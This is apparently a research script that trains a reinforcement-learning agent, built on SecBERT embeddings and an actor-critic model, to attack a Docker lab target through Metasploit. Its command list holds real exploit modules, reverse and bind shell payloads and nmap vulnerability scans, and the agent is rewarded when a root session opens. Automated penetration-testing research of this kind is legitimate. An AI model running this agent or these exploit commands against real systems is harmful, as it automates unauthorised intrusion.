import time
import torch
import pickle
#from env import BashEnv
#from NeuralAgent import NeuralAgent
#from play import play
import sys
import os
import csv
import argparse
from collections import Counter
from time import sleep

import gym
import numpy as np
import gym.spaces
import pexpect, getpass
import textworld
from textworld.core import GameState
#import re
import subprocess
import random
import xml.etree.ElementTree as ET
import re
from typing import List, Mapping, Any, Optional
from collections import defaultdict
import matplotlib.pyplot as plt
import numpy as np

import textworld
import textworld.gym
from textworld import EnvInfos

#import torch
import torch.nn as nn
from torch import optim
import torch.nn.functional as F
from transformers import AutoConfig, AutoTokenizer, AutoModelForMaskedLM
from huggingface_hub import snapshot_download

#import os
from glob import glob
import matplotlib.pyplot as plt
#import gym
#import textworld.gym
import joblib
from os import environ


#assert environ["TRANSFORMERS_OFFLINE"] == "1"

command_list = []

device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

def _strip_input_prompt_symbol(text: str) -> str:
    if text.endswith("\n>"):
        print('strip')
        #print(text[:-2])
        return text[:-2]
    
        #if text.endswith(""):
            #print('strip')
            #return text[:-2]
    
    return text

class BashEnv(textworld.Environment):

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._process = None
        #self.prompt = r"##dkadfa09a2tafd##"
        self.prompt = ">"
        self.prompt2 = " "
        self.flag='Server username: root'
        self.ip_ = None
        self.targetip_ = None
        self.datalist = None
        self.notcommand = ''
        self.notcommand2 = ''
        self.notcommand3 = ''
        self.datalist2 = None
        self.deny = []
        self.count = 0
        self.scan = []
        self.sub_count = 0

    def close(self) -> None:
        if self.game_running:
            self._process.kill(9)
            self._process.wait()
            self._process = None

    def __del__(self):
        self.close()

    def load(self, ulx_file: str) -> None:
        self.close()  # Terminate existing process if needed.
        self._gamefile = ulx_file # 不要

    def ip(self):
        #global ip
        # IP 
        
        child = pexpect.spawn ('msfconsole')
        child.expect ('>')
        #print (child.before)
        child.sendline ("ifconfig | grep inet | grep -e 192  | cut -d: -f2 | awk '{ print $2}' > x.txt")
       
        child.expect ('>')
        #print (child.before)
        x = open('任意', 'r')
        print(x.read())
        self.ip_ = x.read()
        
        #print(self.ip_)
        global myip
        myip = self.ip_
        
        
    def targetip(self):
        global targetip
        self.targetip_ = input('Enter target ip : ')
        print(self.targetip_)
        global targetip__
        targetip__ = self.targetip_
        return targetip__
        #return _targetip
    #xxx2 = env.targetip()
    
    def scan(self):
        
        child = pexpect.spawn ('msfconsole')
        child.expect ('>')
        
        child.sendline("nmap" + ' ' + self.targetip_ + ' ' + '--script vuln' + ' ' + '-oX '+ ' ' +'z.xml')
        child.expect('>', timeout = 600)
        print(child.before)
        
        
    
    def csv(self):
        child = pexpect.spawn ('msfconsole')
        child.expect ('>')
        child.sendline('python3 xml2csv.py -f z.xml -csv serviceport2.csv')
        child.expect('>', timeout = 10)
        print(child.before)
        
        
        #path = Path('/root/zz.csv')
        #csv_list = list(path.glob("*.csv"))
        csv_file = open('任意','r')
        
        a_list = []
        for row in csv.reader(csv_file):
            a_list.append(row[5]) #取得したい列番号を指定（0始まり）

# 先頭行を削除しておく
        del a_list[0]

# テキストに書き込むテキストを作成
        a_text = ""
        for a in reversed(a_list):
            a_text += a
            a_text += "\n\n"

#書き込む
        
        a_file = open("任意", "w")
        a_file.writelines(a_text)
        a_file.close()
        
        
        
        
    def csv2(self):
        csv_file = open('任意','r')
        
        a_list = []
        for row in csv.reader(csv_file):
            a_list.append(row[4]) #取得したい列番号を指定（0始まり）

# 先頭行を削除しておく
        del a_list[0]

# テキストに書き込むテキストを作成
        a_text = ""
        for a in reversed(a_list):
            a_text += a
            a_text += "\n\n"

        
       
        
        
    
  
        
    def search(self):
        global search1
        search1 = []
        print(datalist_2)
        for word in datalist_2:
            search1.append('search'+' '+ word)
            
        return search1
    
    def rport(self):
        global rport
        global rport2
        rport = []
        for word2 in datalist_1:
            rport.append('set rport'+' '+ word2)
        rport2 = np.array(rport, dtype = object)
        return rport2
    
    
   
    @property
    def game_running(self) -> bool:
        """ Determines if the game is still running. """
        return self._process is not None 

    def step(self, command: str) -> str:
        x = len(self.admissiblecommands())
     #   print(x)
        if not self.game_running:
            raise GameNotRunningError()

        self.state = GameState()
     #   print(self.state)
        self.state.last_command = command.strip()
        print('attack!'+str(self.state.last_command))
        self.state.raw = self._send(self.state.last_command)
        print(self.state.raw)
       # print('self.state.raw!'+self.state.raw)
        if self.state.raw is None:
            raise GameNotRunningError()
        self.state.score = 30 if self.won() else -10 if self.lost() else -1
        print(self.state.score)
        f = open('rewardbertcss12.txt', 'a', encoding='UTF-8') 
        f.write(str(self.state.score)+'\n')
        f.close()
        self.state.done = self.lost() or self.won()
     #   print(self.state.done)
        self.state.feedback = _strip_input_prompt_symbol(self.state.raw)
     #   f = open('portservice2.txt', 'r')
     #   service = f.read()
        #print(self.state.feedback)
       
      #  print(self.state.done)
       # if command.startswith('cd'):
            #self.set_dirsfiles()
#            self.set_pwd()
        self.state.infos = {
            'admissible_commands': self.admissiblecommands(),
            'inventory': self.info(),#self.show(),#self.inventory(),
            'description': self.scanz(),#self.info(),#self.pwd(),
           # 'entities': self.scan(),            
            'objective':'RHOST 172.17.0.4',
            'location': self.location(),
           # 'facts':self.show(),
            'lost': self.lost(),
            'won': self.won(),
            'max_score': 100,
            'obs': self.state
        }
        return self.state, self.state.score, self.state.done, self.state.infos

    def _send(self, command: str) -> str:
        """ Send a command directly to the interpreter.

        This method will not affect the internal state variable.
        """
        #print(command)
        if not self.game_running:
            return None

        if len(command) == 0:
            command = ""
        
       
        #if command == 'msfconsole':
            #env.prompt = '>'
            #c_command = command.encode('utf-8')
            #result = self._process.sendline(c_command)
            #env._process.expect(env.prompt, timeout = 30.0)
            #response = env._process.before.decode('utf-8')
            
            
        c_command = command.encode('utf-8')
        
        if command == 'exploit':
            for i in range(1,2):
                    result = self._process.sendline(c_command) 
          #  time.sleep(10.0)
        #print(result)
            
                    try:
                 #   self._process.expect_exact(self._process.buffer)
                  #  self._process.expect('>', timeout = None)
                        self._process.expect(['GDTFHJKI',pexpect.EOF,pexpect.TIMEOUT],timeout=50)
                       # self._process.expect('>')
                        response1 = self._process.before.decode('utf-8')
                        self._process.sendline('') 
                        self._process.expect('GDTFHJKI', timeout = 20)
                        response2 = self._process.before.decode('utf-8')
                      #  self._process.sendline('') 
                      #  self._process.expect('GDTFHJKI', timeout = 1)
                     #   response3 = self._process.before.decode('utf-8')
                      #  self._process.expect_exact(self._process.buffer)
                        response = response2 #+response3
                     #   print(response)
                   # try:
                       # self._process.expect('GDTFHJKI', timeout=.1)
                  #  except pexpect.TIMEOUT:
                                      #    pass
                    except:
                        
                        try:
                            
                             self._process.expect(['ZSFGHTRE',pexpect.EOF,pexpect.TIMEOUT],timeout=5)
                       # self._process.expect('>')
                             response = 'winner'
                             self._process.sendline(' ') 
                             self._process.expect('ZSFGHTRE', timeout = 1)
                        
                        except:
                                print('Timeout')
                              #  self._process.sendline('msfconsole') 
                             #   self._process.expect('>', timeout = 5)
                              #  self._process.sendline('exit') 
                             #   self._process.expect('>', timeout = 1)
                                response = 'winner'#self._process.before.decode('utf-8')
                            #  response = 'loseFDHGHYF'
                            
                        
                        
                    
                    
                    
                        
        
        elif command == 'set rhost 172.18.0.1':
                   self.res = True
                   response = 'loseFDHGHYF'
                            
        else:
            
       
                
                result = self._process.sendline(c_command) 
                loop = True
                response = ''
            #    self._process.expect('GDTFHJKI', timeout=1)
              #  response1 = self._process.before.decode('utf-8')
              #  self._process.sendline('') 
            #    self._process.expect('GDTFHJKI', timeout =1)
              #  response2 = self._process.before.decode('utf-8')
                
            #    response = response1 + response2
                while(loop):
                        try:
                            self._process.expect('GDTFHJKI', timeout=0.1)
                            response = response + '>' + self._process.before.decode('utf-8')
                   #         response1 = self._process.before.decode('utf-8')
                         #   self._process.sendline('') 
                         #   self._process.expect('GDTFHJKI', timeout=0.1)
                          #  response2 = self._process.before.decode('utf-8')
                        except:
                             loop = False
                            
               # response =  response1 + response2    
        return response
         
            
    
            
            
              


    def reset(self) -> str:
        self.close()  # Terminate existing process if needed.
        print('resetされました')
        self.count += 1
       # if self.sub_count == 5:
        #    self.sub_count = 0
      #  self.sub_count += 1
        print(self.count)
        l = [21, 139, 1099, 3632, 6667]
        
       # M = l[self.sub_count]
      #  self.sub_count += 1
        
     #   if self.sub_count == 4:
          #   self.sub_count = 0
        
        M = random.choice(l)
        print(M)
        self.deny.append(M)
        
        O = str(M)
        kid=pexpect.spawn("su")
        kid.expect("Password:")
        kid.sendline("任意")
        kid.expect("#")
        kid.sendline("docker restart metasploit")
        kid.expect("#")
        kid.sendline('docker exec -it metasploitbash')
        kid.expect('#')
        kid.sendline('ufw status')
        kid.expect('#')
        kid.sendline('ufw enable')
        kid.expect('#')
     #   kid.sendline('ufw allow'+ ' ' + O)
   #     kid.expect('#')
        
        
    #    if self.count > 1:
       #     P = self.deny[-2]
     #       P = str(P)
        #    if not O == P:
           #     print(P)
          #      kid.sendline('ufw deny'+ ' ' + P)
        #        kid.expect('#')
    #    self.deny.append(M)
      #  kid.sendline("exit")
   #     kid.expect('#')
        kid.sendline("exit")
        kid.expect("$")
        
        self._process = pexpect.spawn("msfconsole -q")
        self._process.expect(self.prompt)
        
        self._process.sendline('set prompt GDTFHJKI')
        self._process.expect(['GDTFHJKI',pexpect.EOF,pexpect.TIMEOUT])
        self._process.sendline('set meterpreterprompt ZSFGHTRE')
        
#index=_process.expect(['GDTFHJKIY',pexpect.EOF,pexpect.TIMEOUT])
        for i in range(1,4):
              try:
                    print("try")
                    self._process.expect(['GDTFHJKI',pexpect.EOF,pexpect.TIMEOUT])
#                self._process.before.decode('utf-8')
              except:
                    print("except")
                    break
                

    
#print(index)
        X=self._process.before.decode('utf-8')
        print(X)
        self._process.sendline("nmap 172.17.0.4")
        self._process.expect("GDTFHJKI")
        W=self._process.before.decode('utf-8')
      #  input_tuple = W[:200], W[200:]
      #  print(W)
       # f = open('portservice2.txt', 'w')
        W2 = ''.join(W[200:])
        print(W2)
        with open('portservice2.txt', "w") as port:
            port.write(W2)
        
     #   self._process.expect ('>')
        #command = 'export PS1=##dkadfa09a2tafd##'
     #   command = 'no'
     #   c_command = command.encode('utf-8')
     #   result = self._process.sendline(c_command)
#        self._process.expect(self.prompt, timeout=0.01)
      #  while(1):
         #   try:
             #   print("try")
             #   self._process.expect(self.prompt)
#                self._process.before.decode('utf-8')
         #   except:
            #    print("except")
             #   break
       # command = 'pwd'
      #  c_command = command.encode('utf-8')
      #  result = self._process.sendline(c_command)
        obs = 'start'#self._process.before.decode('utf-8')
    #    f = open('portservice2.txt', 'r')
      #  service = f.read()
      #  self.set_dirsfiles()
#        self.set_pwd()
        self.state.infos = {
            'admissible_commands': self.admissiblecommands(),
            'inventory': self.info(),#self.show(),#self.inventory(),
            'description': self.scanz(),#self.info(),#self.pwd(),
            #'entities': self.scan(),
            'objective':'RHOST 172.17.0.4',
            'location': self.location(),
         #   'facts':self.show(),
            'lost': False,
            'won': False,
            'max_score': 100,
            'obs': obs
        }
        return  obs, self.state.infos

    def render(self, mode: str = "human") -> None:
        outfile = StringIO() if mode in ['ansi', "text"] else sys.stdout

        msg = self.state.feedback.rstrip() + "\n"
        if self.display_command_during_render and self.state.last_command is not None:
            msg = '> ' + self.state.last_command + "\n" + msg

        # Wrap each paragraph.
        if mode == "human":
            paragraphs = msg.split("\n")
            paragraphs = ["\n".join(textwrap.wrap(paragraph, width=80)) for paragraph in paragraphs]
            msg = "\n".join(paragraphs)

        outfile.write(msg + "\n")

        if mode == "text":
            outfile.seek(0)
            return outfile.read()

        if mode == 'ansi':
            return outfile
    
    #### CTF問題に固有の設定 ####
    #def search():
        #f = open('/root/serviceport.txt', 'r')

        #datalist = f.readlines()
        #for data in datalist:
            #print(data)
    
    def ls_d(self):
        command_list.append('ls_d')
#        print('ls_d')
        dirs = [re.sub(r'^[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+','',q ) for q in self._send('ls -al').splitlines()[2:-1] if re.match('^d', q)]
        #print(dir)
        return dirs
    def info(self):
       # command_list.append('ls_f')
#        print('ls_f')
       # files = [re.sub(r'^[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+[^ ]+[ ]+','',q ) for q in self._send('ls -al').splitlines()[2:-1] if not re.match('^d', q)]
        #print(files)
        X = self._send('info')
      #  X2 = ''.join(X[500:])
      #  print(X2)
     #   Q = self._send('')
     #   X2 = self._send('info exploit/unix/misc/distcc_exec')
     #   X3 = self._send('info exploit/unix/webapp/sugarcrm_unserialize_exec')
     #   XX = X + X2 + X3
      #  print(XX)
        return X
    def show(self):
       # command_list.append('ls_alld')
        p = self._send('show options')
     #   print(p)
     #   dirs = [q.split()[-1] for q in p.splitlines() ]
        return p
    #def set_pwd(self):
       # command_list.append('pwd')
        print(command_list)
      #  self.pwd = self._send('pwd').splitlines()
    def scanz(self):
      #  dirs = self.pwd
        #print(self.pwd)
        f = open('portservice2.txt', 'r')
        service = f.read()
      #  print(service)
       # print(service)
      #  Q = self._send('')
     #   Z = self._send('nmap 172.17.0.5')
       # Z = 'unko'
       # print(Z)
        
        
     #   print(Z)
        #print(dirs)
       # if len(dirs)!=2:
          #  print("")
           # print(dirs)
            #print(command_list)
        return service
    def location(self):
      #  dirs = self.pwd
        #print(self.pwd)
        Z = self._send('set')
      #  X2 = ''.join(Z[100:])
      #  print(X2)
      #  Q = self._send('')
        return Z
    
    def check(self):
      #  dirs = self.pwd
        #print(self.pwd)
        Z = self._send('check')
        return Z
  
   
    def set_flag(self, id):
        self.flag = "winner" 
        self.flag2 = "You have active sessions open"
    def set_dirsfiles(self):
#        print("set_dirsfiles")
        self.dirs = self.ls_d()
        self.files = self.ls_f()
    
    #pre = preprocessing()
    def admissiblecommands(self):
        #print(self.dirs)
      #  dirs = self.dirs
        
      #  files = self.files
      #  attackcommand = np.array(['run','set rhouse exploit/unix/ftp/vsftpd_234_backdoorst 192.168.56.101','set lhost 192.168.56.1','getuid','whoami'], dtype = object)
     #   attackcommand = np.append(attackcommand, rport2) 
     #   attackcommand = np.append(attackcommand, useexploit2) 
       # print(attackcommand)
        #print(self.ip)
        #print(dirs)
       # print(files)
        #pre = preprocessing()
#        dirs = self.ls_d()
#        files = self.ls_f()
    #    return  attackcommand# ['run'] +['set rhost'+ ' '+targetip__ ]+useexploit2+rport2+['set lhost 192.168.56.1']#+['use 
        return  ['set RHOST 172.17.0.3'] + ['exploit'] + ['set lhost 172.17.0.1'] +['use exploit/multi/misc/java_rmi_server'] + ['use exploit/unix/ftp/vsftpd_234_backdoor'] + ['use exploit/multi/samba/usermap_script'] + ['where']+['set payload cmd/unix/bind_perl'] + ['use exploit/unix/irc/unreal_ircd_3281_backdoor'] + ['use exploit/unix/misc/distcc_exec']+ ['whoami'] + ['pwd'] +  ['getuid'] +  ['cd']  + ['set rhost 172.17.0.4'] + ['show options'] + ['ls'] + ['ps'] + ['grep'] + ['who'] +['show targets'] +['show options']+['set lport 11111'] + ['set lport 22222']+['set lport 33333'] + ['help']+ ['sessions'] + ['search'] + ['jobs'] + ['color'] + ['search usermap_script'] +['route'] + ['banner'] + ['load'] + ['resource'] + ['use'] + ['show nops'] + ['show advanced'] + ['grep -h'] + ['show payloads']# ['set RHOST 172.17.0.4'] + ['exploit'] + ['set lhost 172.17.0.1'] + ['use exploit/unix/ftp/vsftpd_234_backdoor'] + ['use exploit/multi/samba/usermap_script']+['use exploit/multi/misc/java_rmi_server'] + ['where']+['set payload cmd/unix/bind_perl']+['use exploit/unix/irc/unreal_ircd_3281_backdoor'] + ['use exploit/unix/misc/distcc_exec']+ ['whoami'] + ['pwd'] +  ['getuid'] +  ['cd']  + ['set rhost 172.18.0.1']  #+['use exploit/unix/ftp/vsftpd_234_backdoor'] + ['whoami'] + ['pwd']  + ['use exploit/multi/ftp/pureftpd_bash_env_exec']+['ls -al'] + ['set RHOST 172.17.0.3'] + ['exploit'] + ['set lhost 172.17.0.1'] + ['getuid'] + ['show options']  + ['find'] + ['use exploit/unix/misc/distcc_exec']+['use exploit/unix/webapp/sugarcrm_unserialize_exec']+['show targets']+['set payload /cmd/unix/bind_netcat']+['set payload /cmd/unix/bind_perl']+['set payload /cmd/unix/bind_perl_ipv6']+['set payload /cmd/unix/generic']+['set payload /cmd/unix/pingback_bind']+['set payload /cmd/unix/pingback_reverse']+['set payload /cmd/unix/reverse']+['set payload /cmd/unix/reverse_bash_telnet_ssl']+['set payload /cmd/unix/reverse_netcat']+['set payload /cmd/unix/reverse_perl']+['set payload /cmd/unix/reverse_perl_ssl']+['set payload /cmd/unix/reverse_ssl_double_telnet']+['use exploit/multi/http/php_cgi_arg_injection']+['set lport 11111']+['set lport 22222']+['set lport 33333'] + ['set rhost 172.18.0.1'] #+ ['nmap 172.17.0.2']  #
    #["grep -H 'Capture The Flag' * | sed -e 's/:/ /g'"]+['pwd']+['cd '+d for d in dirs]
    def inventory(self):
        return self.dirs
#        return self.ls_d()
    def lost(self):
      #  courseout = False if re.match(r'/workdir/textworld/Nosharp(/a|/b|/c|)', self.pwd()) else True
        self.notcommand = 'loseFDHGHYF'
      #  self.notcommand2 = 'Failed'
      #  self.notcommand3 = 'Error'
        return True if re.search(self.notcommand, self.state.raw) else False #if re.search(self.notcommand2, self.state.raw) else True if re.search(self.notcommand3, self.state.raw) else False
    
    
    
  #  100 if self.won() else -5 if self.lost() else -1
#    def won(self):
#        return self.pwd()==self.flag
    #def won(self):
        #p = pexpect.spawn('run')
        #if p.expect(''):
            #return True
        #else:
            #eturn False
      
    def won(self):
        return True if re.search(self.flag, self.state.raw) else True if re.search(self.flag2, self.state.raw) else False
        
#device = 'cuda' if torch.cuda.is_available() else 'cpu'     
#print(device) 
      
        
class CommandScorer(nn.Module):
    def __init__(self, input_size, hidden_size):
        super(CommandScorer, self).__init__()
        torch.manual_seed(42)  # For reproducibility
        self.embedding    = nn.Embedding(input_size, hidden_size)
        self.encoder_gru  = nn.GRU(hidden_size, hidden_size)
        self.cmd_encoder_gru  = nn.GRU(hidden_size, hidden_size)
      #  self.state_gru    = nn.GRU(768, hidden_size)
        self.state_gru    = nn.GRU(789504, hidden_size )  #394752
      #  self.state_gru    = nn.GRU(197376, hidden_size)
        self.hidden_size  = hidden_size
        self.state_hidden = torch.zeros(1,1,hidden_size, device=device)
      #  self.state_hidden2 = torch.zeros(2,1,hidden_size, device=device)
        self.critic       = nn.Linear(hidden_size, 1)
        self.att_cmd      = nn.Linear(hidden_size*2, 1)
      #  self.model = AutoModelForMaskedLM.from_pretrained("jackaduma/SecBERT")
        self.download_path = snapshot_download(repo_id="jackaduma/SecBERT")
       # self.model = "jackaduma/SecBERT"
        self.model_config = AutoConfig.from_pretrained(self.download_path, output_hidden_states=True)
        self.model2 = AutoModelForMaskedLM.from_pretrained(self.download_path, config=self.model_config)
        self.model2 = self.model2.cuda()

        
    def forward(self, obs1, obs2, obs3, obs4, commands, **kwargs):
      #  input_length = obs.size(0)
      #  batch_size = obs.size(1)
        nb_cmds = commands.size(1)
        batch_size = 1
     #   nb_cmds = 20
        
      #  embedded = self.embedding(obs)
     #   encoder_output, encoder_hidden = self.encoder_gru(embedded)
        
        outputs1 = self.model2(**obs1)#.cuda()
        outputs2 = self.model2(**obs2)
        outputs3 = self.model2(**obs3)
        outputs4 = self.model2(**obs4)
      #  print(outputs)
       # outputs = self.model2(**obs)
        input_list = [outputs1.hidden_states[-1], outputs2.hidden_states[-1], outputs3.hidden_states[-1],outputs4.hidden_states[-1]]
        outputs = torch.stack(input_list, 0)
    #    print(outputs.shape)
        Z = torch.reshape(outputs,(1,1,789504)).to(device)
      #  last_hidden_states = outputs.hidden_states[-1]
     #   print(last_hidden_states)
        state_output, state_hidden = self.state_gru(Z, self.state_hidden)#.to(device)
      #  print(state_output.shape)
    #    state_hidden = torch.reshape(state_hidden,(1,1,256)).to(device)
        
        self.state_hidden = state_hidden
        value = self.critic(state_output)

        # Attention network over the commands.
        cmds_embedding = self.embedding.forward(commands)
     #   print(cmds_embedding.shape)
      #  outputs2 = self.model2(**commands)
     #   cmds_encoding_last_states = outputs2.hidden_states[-1]
        _, cmds_encoding_last_states = self.cmd_encoder_gru.forward(cmds_embedding)  # 1 x cmds x hidden
      #  outputs5 = self.model2(**commands)
   #     cmds_encoding_last_states = outputs5.hidden_states[-1]
     #   print(cmds_encoding_last_states.shape)
     #   cmds_encoding_last_states = torch.reshape(cmds_encoding_last_states,(1,8,256)).to(device)
 
        # Same observed state for all commands.
        cmd_selector_input = torch.stack([state_hidden] * nb_cmds, 2)  # 1 x batch x cmds x hidden
        print(cmd_selector_input.shape)
      #  cmd_selector_input = torch.reshape(cmd_selector_input,(1,15,256))
        # Same command choices for the whole batch.
        cmds_encoding_last_states = torch.stack([cmds_encoding_last_states] * batch_size, 1)  # 1 x batch x cmds x hidden
        print(cmds_encoding_last_states.shape)
        
    #    cmds_encoding_last_states = torch.reshape(cmds_encoding_last_states,(1,1,20,12288))

        # Concatenate the observed state and command encodings.
        cmd_selector_input = torch.cat([cmd_selector_input, cmds_encoding_last_states], dim=-1)
        print(cmd_selector_input.shape)
        # Compute one score per command.
        scores = F.relu(self.att_cmd(cmd_selector_input)).squeeze(-1)  # 1 x Batch x cmds
     #   print(scores.shape)
        probs = F.softmax(scores, dim=2)  # 1 x Batch x cmds
        index = probs[0].multinomial(num_samples=1).unsqueeze(0) # 1 x batch x indx
        return scores, index, value

    def reset_hidden(self, batch_size):
        self.state_hidden = torch.zeros(1, batch_size, self.hidden_size, device=device)
        


class NeuralAgent:
    """ Simple Neural Agent for playing TextWorld games. """
    MAX_VOCAB_SIZE = 10000
    UPDATE_FREQUENCY = 20
    LOG_FREQUENCY = 100
    GAMMA = 0.95
    
    def __init__(self) -> None:
        self._initialized = False
        self._epsiode_has_started = False
        self.id2word = ["<PAD>", "<UNK>"]
        self.word2id = {w: i for i, w in enumerate(self.id2word)}
        
        self.model = CommandScorer(input_size=self.MAX_VOCAB_SIZE, hidden_size=128).to(device)
        self.optimizer = optim.Adam(self.model.parameters(), 0.0005)
        
        self.mode = "train"
        self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
        self.transitions = []
        self.model.reset_hidden(1)
        self.last_score = 0
        self.no_train_step = 0
    
    def train(self):
        self.mode = "train"
        self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
        self.transitions = []
        self.model.reset_hidden(1)
        self.last_score = 0
        self.no_train_step = 0
    
    def test(self):
        self.mode = "test"
        self.model.reset_hidden(1)
        
    @property
    def infos_to_request(self) -> EnvInfos:
        return EnvInfos(description=True, inventory=True,objective=True,entities=True,location=True,facts=True, admissible_commands=True,won=True, lost=True)
    
    def _get_word_id(self, word):
        if word not in self.word2id:
            if len(self.word2id) >= self.MAX_VOCAB_SIZE:
                return self.word2id["<UNK>"]
            
            self.id2word.append(word)
            self.word2id[word] = len(self.word2id)
            
        return self.word2id[word]
            
    def _tokenize(self, text):
        # Simple tokenizer: strip out all non-alphabetic characters.
        text = re.sub("[^a-zA-Z0-9\- ]", " ", text)
        word_ids = list(map(self._get_word_id, text.split()))
        return word_ids

    def _process(self, texts):
        texts = list(map(self._tokenize, texts))
        max_len = max(len(l) for l in texts)
        padded = np.ones((len(texts), max_len)) * self.word2id["<PAD>"]

        for i, text in enumerate(texts):
            padded[i, :len(text)] = text

        padded_tensor = torch.from_numpy(padded).type(torch.long).to(device)
        padded_tensor = padded_tensor.permute(1, 0) # Batch x Seq => Seq x Batch
        return padded_tensor
      
    def _discount_rewards(self, last_values):
        returns, advantages = [], []
        R = last_values.data
        for t in reversed(range(len(self.transitions))):
            rewards, _, _, values = self.transitions[t]
            R = rewards + self.GAMMA * R
            adv = R - values
            returns.append(R)
            advantages.append(adv)
            
        return returns[::-1], advantages[::-1]

    def act(self, obs: str, score: int, done: bool, infos: Mapping[str, Any]) -> Optional[str]:
        global policy
        global value
        global entropy
        
        policy,value,entropy = [], [], []
        
        tokenizer = AutoTokenizer.from_pretrained("jackaduma/SecBERT")
        
      #  print(obs)
      #  input_ = "{}\n{}\n{}\n{}\n{}\n{}\n{}".format(obs,infos["description"], infos['inventory'],infos['objective'],infos['location'],infos['lost'],infos['won'])#infos['facts'])#.format(obs,infos["description"],infos['objective'],infos['location'])
#format(obs,infos["description"], infos['inventory'],infos['objective'],infos['location'],infos['facts'])
        input_1 = "{}".format(infos["description"])
        input_2 = "{}".format(infos['inventory'])
        input_3= "{}\n{}\n{}\n{}".format(infos['objective'],infos['location'],infos['lost'],infos['won'])
        input_4 = "{}".format(obs)
      #  length = int(len(input_)/2)
      #  print(len(input_))
     #   print(length)
     #   input_tuple = input_[:length], input_[length:]
     #   input_list = list(input_tuple)
     #   print(input_list)
       # input_tensor = tokenizer([input_], return_tensors="pt", max_length=514, padding='max_length', truncation=True)
        input_tensor1 = tokenizer([input_1], return_tensors="pt", max_length=257, padding='max_length', truncation=True)
        
        input_tensor2 = tokenizer([input_2], return_tensors="pt", max_length=257, padding='max_length', truncation=True)
        
        input_tensor3 = tokenizer([input_3], return_tensors="pt", max_length=257, padding='max_length', truncation=True)
        
        input_tensor4 = tokenizer([input_4], return_tensors="pt", max_length=257, padding='max_length', truncation=True)
        
        
    
     #   print(input_tensor3['input_ids'])
        
      #  outputs = model(**inputs)
        
        # Build agent's observation: feedback + look + inventory.
     #   input_ = "{}\n{}\n{}\n{}\n{}\n{}".format(obs,infos["description"], infos["entities"],infos['inventory'],infos['objective'],infos['location'])
       # print(input_)
      #  print(input_)
        # Tokenize and pad the input and the commands to chose from.
     #   input_tensor = self._process([input_])
        commands_tensor = self._process(infos["admissible_commands"])
      #  print(commands_tensor)
      #  with open('portservice3.txt', "w") as se:
          #  port.write(input_tensor['input_ids'])
       # commands_tensor = tokenizer(infos["admissible_commands"], return_tensors="pt",max_length=257, padding=True, truncation=True)
        # Get our next action and value prediction.
        outputs, indexes, values = self.model(input_tensor1,input_tensor2,input_tensor3, input_tensor4, commands_tensor)
        action = infos["admissible_commands"][indexes[0]]
        
        if self.mode == "test":
            if done:
                self.model.reset_hidden(1)
            return action
        
        self.no_train_step += 1
        print(self.no_train_step)
        
        if self.transitions:
            reward = score - self.last_score  # Reward is the gain/loss in score.
          #  print(reward)
            self.last_score = score
            if infos["won"]:
                reward += 30
            if infos["lost"]:
                reward -= 10
            #print (self.transition[-1][0])  
            self.transitions[-1][0] = reward  # Update reward information.
            print(reward)
        
        self.stats["max"]["score"].append(score)
        if self.no_train_step % self.UPDATE_FREQUENCY == 0:
            # Update model
            returns, advantages = self._discount_rewards(values)
            
            loss = 0
            for transition, ret, advantage in zip(self.transitions, returns, advantages):
                reward, indexes_, outputs_, values_ = transition
               
                with open('reward.txt', 'a') as f:
                    f.write(str(reward)+'\n')
                f.close()
                
                advantage        = advantage.detach() # Block gradients flow here.
                probs            = F.softmax(outputs_, dim=2)
                log_probs        = torch.log(probs)
                log_action_probs = log_probs.gather(2, indexes_)
                policy_loss      = (-log_action_probs * advantage).sum()
                value_loss       = (.5 * (values_ - ret) ** 2.).sum()
                entropy     = (-probs * log_probs).sum()
                loss += policy_loss + 0.5 * value_loss - 0.1 * entropy
                
                self.stats["mean"]["reward"].append(reward)
               
              #  print(self.stats["mean"]["reward"])
                self.stats["mean"]["policy"].append(policy_loss.item())
                #policy.append(self.stats["mean"]["policy"])
                self.stats["mean"]["value"].append(value_loss.item())
                #value.append(value_loss.item())
                self.stats["mean"]["entropy"].append(entropy.item())
                #entropy.append(entropy.item())
                self.stats["mean"]["confidence"].append(torch.exp(log_action_probs).item())
                #print(self.stats["mean"])
                #print(policy)
                
                
        
            
            if self.no_train_step % self.LOG_FREQUENCY == 0:
                msg = "{}. ".format(self.no_train_step)
                msg += "  ".join("{}: {:.3f}".format(k, np.mean(v)) for k, v in self.stats["mean"].items())
                msg += "  " + "  ".join("{}: {}".format(k, np.max(v)) for k, v in self.stats["max"].items())
                msg += "  vocab: {}".format(len(self.id2word))
                print("\n"+msg)
#                print(probs)
#                print(log_probs)
#                print(log_action_probs)
                self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
            
            loss.backward()
            nn.utils.clip_grad_norm_(self.model.parameters(), 40)
            self.optimizer.step()
            self.optimizer.zero_grad()
        
            self.transitions = []
            self.model.reset_hidden(1)
        else:
            # Keep information about transitions for Truncated Backpropagation Through Time.
            self.transitions.append([None, indexes, outputs, values])  # Reward will be set on the next call
        
        if done:
            self.last_score = 0  # Will be starting a new episode. Reset the last score.
            self.model.reset_hidden(1) # 追加
        
        return action
       # episode = list(range(1,6))
        #plt.plot(episode,stats["mean"]["policy"]) 
       # plt.xlabel("episode")
       # plt.ylabel("policy_loss")
       # plt.savefig("result1.jpg")
       # plt.show()
        
       # plt.plot(episode,stats["mean"]["value"]) 
       # plt.xlabel("episode")
       # plt.ylabel("value_loss")
       # plt.savefig("result2.jpg")
       # plt.show()
        
       # plt.plot(episode,stats["mean"]["entropy"]) 
       # plt.xlabel("episode")
       # plt.ylabel("entropy_loss")
       # plt.savefig("result3.jpg")
       # plt.show()





    
    
    
    
    
    
    

def play(agent, env, pathNo, max_step=300, nb_episodes=1, verbose=True):
    #joblib.load('trained_agent3.pkl')
    #load_df.head()
  #  env.ip()
    #env.targetip()
    #env.scan()
 #   env.csv()
 #   env.csv2()
    
  #  env.extract()
 #   env.search()
  #  env.rport()
  #  env.exploitcode()
    
    infos_to_request = agent.infos_to_request
    infos_to_request.max_score = True  # Needed to normalize the scores.
    
   
    # Collect some statistics: nb_steps, final reward.
